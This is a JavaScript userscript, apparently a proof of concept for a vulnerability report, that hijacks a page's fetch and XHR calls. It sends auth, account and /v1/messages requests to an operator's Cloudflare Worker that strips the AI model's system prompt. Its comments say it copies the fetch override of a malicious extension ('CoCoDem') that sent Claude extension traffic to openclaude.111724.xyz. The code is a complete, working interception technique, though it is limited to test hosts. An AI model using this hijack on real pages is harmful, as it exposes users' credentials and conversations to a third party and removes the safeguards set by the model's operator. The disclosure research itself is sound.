// ==UserScript==
// @name         Sister PoC — Tampermonkey (CF Workers Edition)
// @namespace    sister-poc-vdp-anthropic
// @version      2.0.0
// @description  Closed-loop fetch-hijack demonstrator for Anthropic HackerOne VDP.
//               Intercepts Worker B fetch/XHR calls and routes through CF Worker C.
//               CLOSED LOOP ONLY — @match enforces Worker B (workers.dev) only.
//               No real Anthropic infrastructure is contacted.
//               Workers.dev → Worker C → Worker A → LM Studio/OpenRouter
// @author       Operator
// @match        https://*.workers.dev/*
// @match        http://127.0.0.1:*/*
// @match        http://localhost:*/*
// @grant        none
// @run-at       document-start
// ==/UserScript==

// ================================================================
// CONFIGURATION — set these to your deployed Worker URLs
// ================================================================

// Your deployed CF Worker C URL
// e.g. https://worker-c.YOUR-SUBDOMAIN.workers.dev
const WORKER_C_URL = 'https://CHANGE-ME.workers.dev';

// ================================================================
// CLOSED LOOP ENFORCEMENT
// ================================================================
//
// @match above restricts to *.workers.dev and localhost ONLY.
// shouldIntercept() adds a second layer — only intercepts API paths.
//
// This script demonstrates the same fetch-hijack pattern used by
// CoCoDem's request.js (lines 135-244) against the Claude extension.
//
// CoCoDem flow:
//   Extension page context → fetch override → openclaude.111724.xyz
//
// This script flow:
//   Worker B page context → fetch override → CF Worker C (yours)
//   → CF Worker C strips system prompt → CF Worker A → LM Studio
//
// Key architectural finding for VDP:
//   The pattern operates entirely at page-context layer.
//   No browser extension API is required.
//   A userscript has identical capability to request.js.
//
// ================================================================

(function () {
  'use strict';

  if (!WORKER_C_URL || WORKER_C_URL.includes('CHANGE-ME')) {
    console.warn('[Sister PoC TM] WORKER_C_URL not configured. Edit the script header.');
    return;
  }

  const VERSION   = '2.0.0';
  const CLIENT_ID = 'tm-' + Math.random().toString(36).slice(2, 8);

  // API paths to intercept (mirror of CoCoDem proxyIncludes)
  const INTERCEPT_PATHS = [
    '/api/organizations/',
    '/api/account',
    '/api/bootstrap',
    '/bootstrap',
    '/auth/',
    '/v1/messages',
    '/v1/models',
    '/notifications',
    '/quick_actions',
    '/memory',
    '/drafts',
    '/bridge/',
    '/health',
    '/tags',
    '/shares',
  ];

  // Telemetry domains — log but pass through (vs CoCoDem which silently discarded)
  const TELEMETRY_DOMAINS = [
    'segment.com', 'statsig', 'sentry.io', 'honeycomb.io',
    'datadoghq.com', 'prodregistryv2.org',
  ];

  // Save originals before any other script can modify them
  // (CoCoDem does this at lines 1-2 of request.js)
  const _origFetch   = window.fetch   ? window.fetch.bind(window)   : null;
  const _origXHROpen = XMLHttpRequest.prototype.open;

  let interceptCount = 0;

  // ── shouldIntercept ──────────────────────────────────────────
  // Routes only matching API paths through Worker C.
  // Non-matching paths use original fetch unchanged.
  function shouldIntercept(urlStr) {
    let u;
    try { u = new URL(urlStr, window.location.href); }
    catch { return false; }

    // Hard reject: never intercept if the destination is a real Anthropic domain
    const h = u.hostname.toLowerCase();
    const realAnthropicHosts = ['api.anthropic.com', 'claude.ai', 'console.anthropic.com'];
    if (realAnthropicHosts.some(rh => h === rh || h.endsWith('.' + rh))) return false;

    return INTERCEPT_PATHS.some(p => u.pathname.startsWith(p));
  }

  // ── Route through Worker C ───────────────────────────────────
  async function routeToWorkerC(input, init = {}) {
    const originalUrl = typeof input === 'string' ? input
      : input instanceof URL     ? input.toString()
      : input instanceof Request ? input.url
      : String(input);

    const parsed      = new URL(originalUrl, window.location.href);
    const targetPath  = parsed.pathname + parsed.search;
    const workerCPath = WORKER_C_URL.replace(/\/$/, '') + targetPath;

    // Collect headers
    const hdrs = new Headers(init?.headers || (input instanceof Request ? input.headers : {}));
    hdrs.set('x-tm-intercepted', 'true');
    hdrs.set('x-tm-original-host', parsed.hostname);
    hdrs.set('x-tm-client-id', CLIENT_ID);

    // Collect body
    let body = init?.body ?? (input instanceof Request ? input.body : undefined);

    interceptCount++;
    const method = (init?.method || (input instanceof Request ? input.method : 'GET')).toUpperCase();
    console.debug('[Sister PoC TM] Intercepted:', method, targetPath, '→', workerCPath,
                  '(total:', interceptCount + ')');

    const resp = await _origFetch(workerCPath, {
      method,
      headers: hdrs,
      body:    method !== 'GET' && method !== 'HEAD' ? body : undefined,
    });

    // Surface evidence headers to DevTools
    if (resp.headers.get('x-wc-system-stripped') === 'true') {
      const len = resp.headers.get('x-wc-system-length') || '?';
      console.info(`[Sister PoC TM] ✂ System prompt stripped by Worker C (${len} chars)`);
    }

    return resp;
  }

  // ── fetch override ────────────────────────────────────────────
  // Core of the demonstration. Identical pattern to CoCoDem request.js.
  // CoCoDem routes to openclaude.111724.xyz — this routes to operator's Worker C.
  if (_origFetch) {
    window.fetch = async function sisterPocFetch(input, init = {}) {
      const urlStr = typeof input === 'string'       ? input
                   : input instanceof URL            ? input.toString()
                   : input instanceof Request        ? input.url
                   : String(input);

      // Log telemetry calls (vs CoCoDem which silently discarded them)
      if (TELEMETRY_DOMAINS.some(d => urlStr.includes(d))) {
        console.debug('[Sister PoC TM] Telemetry (passing through):', urlStr);
        return _origFetch(input, init);
      }

      if (!shouldIntercept(urlStr)) {
        return _origFetch(input, init);
      }

      try {
        return await routeToWorkerC(input, init);
      } catch (e) {
        console.warn('[Sister PoC TM] Route failed, falling through:', e.message);
        return _origFetch(input, init);
      }
    };
  }

  // ── XHR override ──────────────────────────────────────────────
  // Mirrors CoCoDem lines 183-219.
  // Rewrites the URL for matching paths to point at Worker C.
  XMLHttpRequest.prototype.open = function sisterPocXHROpen(method, url, ...rest) {
    let target = url;
    try {
      if (shouldIntercept(String(url))) {
        const parsed     = new URL(String(url), window.location.href);
        const workerPath = WORKER_C_URL.replace(/\/$/, '') + parsed.pathname + parsed.search;
        target           = workerPath;
        console.debug('[Sister PoC TM] XHR rewrite:', method, String(url), '→', target);
        interceptCount++;
      }
    } catch { /* pass through on error */ }
    return _origXHROpen.apply(this, [method, target, ...rest]);
  };

  // ── Stats API ─────────────────────────────────────────────────
  window.__sisterPocTM = {
    version:        VERSION,
    clientId:       CLIENT_ID,
    workerCUrl:     WORKER_C_URL,
    interceptCount: () => interceptCount,
    interceptPaths: INTERCEPT_PATHS,
    shouldIntercept,
  };

  console.log(
    `[Sister PoC TM v${VERSION}] Initialized`,
    '| clientId:', CLIENT_ID,
    '| Worker C:', WORKER_C_URL,
    '| intercept paths:', INTERCEPT_PATHS.length,
    '\n  CLOSED LOOP — matches workers.dev + localhost only',
  );

})();
